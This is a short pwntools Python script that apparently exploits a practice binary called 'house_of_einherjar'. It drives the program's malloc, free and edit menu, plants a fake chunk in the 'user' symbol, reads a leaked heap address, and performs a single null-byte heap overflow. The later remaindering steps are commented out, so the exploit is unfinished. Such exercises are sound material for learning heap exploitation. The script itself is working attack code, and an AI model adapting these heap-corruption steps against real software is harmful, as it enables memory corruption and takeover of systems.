#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("house_of_einherjar")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def malloc(size):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

# Select the "edit" option; send index & data.
def edit(index, data):
    io.send(b"3")
    io.sendafter(b"index: ", f"{index}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")

io = start()

# =============================================================================

# Populate the username field.
payload = flat(
  0,
  0x8,
  elf.sym["user"],
  elf.sym["user"],
)

io.sendafter(b"username: ", payload)

# This program leaks its default heap start address.
io.recvuntil(b"heap @ ")
heap = int(io.recvline(), 16)
io.recvuntil(b"> ")

# Request 2 chunks.
chunk_A = malloc(0x88)
chunk_B = malloc(0x208)
chunk_C = malloc(0x88)

edit(chunk_B, b"B" * 0x1f0 + p64(0x200))

free(chunk_B)

# Single nullbyte overflow
edit(chunk_A, b"A" * 0x88 + b"\x00")


# # Remaindering
# chunkB1 = malloc(0xf8)
# chunkB2 = malloc(0xf8)

# =============================================================================

io.interactive()
